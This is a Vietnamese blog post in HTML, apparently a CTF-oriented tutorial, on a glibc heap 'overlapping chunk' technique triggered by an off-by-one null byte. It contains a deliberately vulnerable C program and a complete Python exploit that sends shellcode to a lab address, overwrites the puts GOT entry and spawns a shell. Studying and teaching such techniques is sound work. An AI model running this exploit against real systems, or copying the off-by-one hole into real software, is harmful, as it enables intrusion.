@@ -1,0 +1,289 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>The Forgotten Chunk - HarDToBelieve's Blog</title>
+  <meta name="author" content="HarDToBelieve">
+
+  
+  <meta name="description" content="The Forgotten Chunk written in exploitation Như ta đã biết, Unlink Technique là 1 công cụ rất mạnh để khai thác các lỗ hổng ở vùng nhớ heap, tuy &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://hardtobelieve.github.io/blog/2016/05/15/the-forgotten-chunk">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="HarDToBelieve's Blog" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  
+
+</head>
+
+  <body>
+    <a href="/" class="home-icon">
+      <img src="/images/home.png"/>
+    </a>
+
+    <article role="article" class="full-single-article">
+  <div class="container">
+    <div class="row">
+      <div class="col-md-10 col-md-offset-1">
+        <h1>The Forgotten Chunk</h1>
+        <div class="meta">
+          written 
+
+
+
+
+
+
+
+
+  
+
+
+
+<time datetime="2016-05-15T15:12:25+07:00" pubdate data-updated="true"></time>
+          
+
+in
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/exploitation/'>exploitation</a>
+  
+</span>
+
+
+        </div>
+        <p>Như ta đã biết, Unlink Technique là 1 công cụ rất mạnh để khai thác các lỗ hổng ở vùng nhớ heap, tuy nhiên nhược điểm khá lớn ở kỹ thuật này là ta phải viết tràn được từ heap này sang heap kia (heap overflow) hoặc free 1 vùng nhớ 2 lần (double free). Điều này sẽ gặp trở ngại nếu ta kiểm soát số lượng bytes nhập vào và kiểm tra điều kiện trước free. Bài viết này sẽ đề cập đến một kỹ thuật khác hỗ trợ khá tốt cho Unlink Technique.</p>
+
+<!--more-->
+
+
+<h1>Ý tưởng bài toán</h1>
+
+<p>Như bài viết trước đã đề cập, khi ta free một chunk, chương trình sẽ tìm đến chunk cuối cùng của unsorted bin (danh sách các chunk đã được free trước đó), sau đó sẽ thực hiện thao tác hợp lại. Có 2 điều thú vị ta có thể nhận ra sau khi quan sát kỹ cách hoạt động của hàm free và malloc:</p>
+
+<ul>
+<li>Khi malloc 1 vùng nhớ có kích thước nhỏ hơn kích thước một vùng nhớ khác đã được free trước đó, lẽ ra hàm malloc sẽ phải update trường <code>prev_size</code> của chunk tiếp theo, tuy nhiên malloc lại &ldquo;tìm&rdquo; chunk tiếp theo bằng cách lấy <a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3619">địa chỉ chunk đã free trước đó cộng với kích thước của nó</a>.</li>
+</ul>
+
+
+<p>=> Nếu ta điều khiển được kích thước đó sau khi đã free thì sao?</p>
+
+<ul>
+<li>Khi free, hàm free() lẽ ra phải kiểm tra xem trường <code>prev_size</code> của chunk cần free có đúng bằng với <code>size</code> của chunk trước đó hay không, nhg ko, lại một lần nữa hàm free() lại &ldquo;tìm&rdquo; chunk trước đó để họp lại bằng cách lấy địa chỉ chunk hiện tại trừ đi <code>prev_size</code> của nó</li>
+</ul>
+
+
+<p>=> Có khả năng các chunk nẳm giữa 2 chunk chuẩn bị hợp lại này sẽ bị &ldquo;lãng quên&rdquo; vào cùng bị hơp vào</p>
+
+<p>Để thấy được rõ hơn, ta sẽ đi vào kịch bản cụ thể</p>
+
+<h1>Kịch bản ( Overlapping chunk )</h1>
+
+<p>Giả sử ta có chương trình như sau:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="c1">//gcc -z execstack -o obo offByOne_heap.c</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="kt">int</span> <span class="n">list_addr</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span> <span class="p">()</span> <span class="p">{</span>
+</span><span class='line'>  <span class="n">list_addr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">list_addr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x200</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">list_addr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">list_addr</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span><span class='line'>  <span class="n">fgets</span><span class="p">(</span><span class="n">list_addr</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mh">0x109</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>                  <span class="c1">// [1]</span>
+</span><span class='line'>  <span class="n">list_addr</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">list_addr</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">list_addr</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span>                                  
+</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">list_addr</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>                                  
+</span><span class='line'>  <span class="n">list_addr</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x300</span><span class="p">);</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="n">fgets</span><span class="p">(</span><span class="n">list_addr</span><span class="p">[</span><span class="mi">5</span><span class="p">],</span> <span class="mh">0x300</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>                  <span class="c1">// [2]</span>
+</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">list_addr</span><span class="p">[</span><span class="mi">4</span><span class="p">]);</span>
+</span><span class='line'>  <span class="n">fgets</span><span class="p">(</span><span class="n">list_addr</span><span class="p">[</span><span class="mi">5</span><span class="p">],</span> <span class="mh">0x300</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">fgets</span><span class="p">(</span><span class="n">list_addr</span><span class="p">[</span><span class="mi">5</span><span class="p">],</span> <span class="mh">0x300</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Good bye!&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Ta có thể thấy ở đây chương trình kiểm soát số bytes nhập vào bằng hàm fgets nên không thể thực hiện Unlink Technique ngay được. Tại [1], chương trình cho ta nhập 0x109 bytes, mặt khác lượng bytes chứa data của list_addr[0] là 0x100, vậy byte cuối cùng ( null byte do fgets thêm vào ) đã bị đè vào trường <code>size</code> của list_addr[1]. Như đã phân tích ở phần trước, trường <code>prev_size</code> của list_addr[2] sẽ không được cập nhật ở câu lệnh malloc sau đó, mà lại được cập nhật ở trước đó 10 bytes, đúng với lượng bytes đã mất của trường <code>size</code>!!</p>
+
+<p><img src="/assets/forgotten/malloc.png" height="966" width="992" alt="" /></p>
+
+<p>Sau đó, ta malloc 2 vùng nhớ có tổng kích thước &lt; kích thước của vùng nhớ list_addr[1] đã được free trước đó. Khi ta free list_addr[3] và free list_addr[2], hàm free sẽ nghiêm nhiên coi 2 chunk này là liền nhau và thực hiện thao tác hợp => list_addr[4] đã bị &ldquo;lãng quên&rdquo;. Bằng chứng là khi malloc list_addr[5], địa chỉ của list_addr[5] sẽ nhỏ hơn địa chỉ của list_addr[4]</p>
+
+<p><img src="/assets/forgotten/free.png" height="966" width="992" alt="" /></p>
+
+<p>Từ đây, ta có thể sử dụng Unlink Technique một cách dễ dàng với file exploit.py đầy đủ sau:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">hardtobelieve</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">list_addr</span> <span class="o">=</span> <span class="mh">0x601080</span>
+</span><span class='line'><span class="n">heap_addr</span> <span class="o">=</span> <span class="mh">0x602110</span>
+</span><span class='line'><span class="n">puts_got</span> <span class="o">=</span> <span class="mh">0x601020</span>
+</span><span class='line'><span class="n">block_size</span> <span class="o">=</span> <span class="mh">0x8</span>
+</span><span class='line'>
+</span><span class='line'><span class="c">#print hex(0x602140 + len(shcode64()) + 5)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">HarDToSock</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">&quot;192.168.37.130&quot;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">1928</span><span class="p">)</span>
+</span><span class='line'><span class="n">offByone</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mh">0x108</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">offByone</span><span class="p">)</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x00</span><span class="s">&quot;</span> <span class="o">*</span> <span class="n">block_size</span> <span class="o">*</span> <span class="mi">2</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">list_addr</span> <span class="o">+</span> <span class="mi">5</span><span class="o">*</span><span class="n">block_size</span> <span class="o">-</span> <span class="mi">3</span><span class="o">*</span><span class="n">block_size</span><span class="p">)</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">list_addr</span> <span class="o">+</span> <span class="mi">5</span><span class="o">*</span><span class="n">block_size</span> <span class="o">-</span> <span class="mi">2</span><span class="o">*</span><span class="n">block_size</span><span class="p">)</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">shcode64</span><span class="p">()</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span> <span class="o">*</span> <span class="mi">5</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;B&quot;</span> <span class="o">*</span> <span class="n">block_size</span> <span class="o">*</span> <span class="mi">24</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">sendln</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">overwrite_1</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'><span class="n">overwrite_1</span> <span class="o">+=</span> <span class="s">&quot;C&quot;</span><span class="o">*</span><span class="mi">3</span><span class="o">*</span><span class="n">block_size</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">sendln</span><span class="p">(</span><span class="n">overwrite_1</span><span class="p">)</span>
+</span><span class='line'><span class="n">overwrite_2</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'><span class="n">overwrite_2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_addr</span> <span class="o">+</span> <span class="mi">6</span><span class="o">*</span><span class="n">block_size</span><span class="p">)</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">overwrite_2</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">hardtopwn</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Và sau đó, shell là của chúng ta!!</p>
+
+<p><img src="/assets/forgotten/exploit.png" alt="Happy hacking :D" /></p>
+
+<h1>Nhận xét</h1>
+
+<p>Đây là một sự hỗ trợ đắc lực cho các kỹ thuật khác và nó rất hay gặp trong các bài CTF ( khi mà hàm đọc bị lỗi và dư ra null byte ở cuối )</p>
+
+
+        <hr class="divider-short"/>
+
+        
+      </div>
+    </div>
+  </div>
+</article>
+
+<hr class="divider-short"/>
+
+<div class="archive-link">
+  <div class="container">
+    <div class="row">
+      <div class="col-md-8 col-md-offset-2">
+        
+          <a class="pull-left" href="/blog/2016/05/15/unlink-technique/" title="Previous Post: Unlink Technique">&laquo; Previous: Unlink Technique</a>
+        
+
+        
+          <a class="pull-right" href="/blog/2016/06/14/fastbin/" title="Next Post: Fastbin technique">Next: Fastbin technique &raquo;</a>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+    <footer id="footer" class="her-row">
+  <div class="container">
+    <div class="row">
+      <div class="col-md-1">
+  <a href="/"><h4>Home</h4></a>
+</div>
+
+<div class="col-md-2">
+  <div class="social-icon-list">
+    
+
+    
+
+    
+
+    
+  </div>
+</div>
+
+<div class="pull-right">
+  <h4>Powered by <a href="http://octopress.org/">Octopress</a>. Designed by <a href="http://AdrianArtiles.com">Adrian Artiles</a>.</h4>
+</div>
+
+
+    </div>
+  </div>
+</footer>
+
+    
+  </body>
+</html>
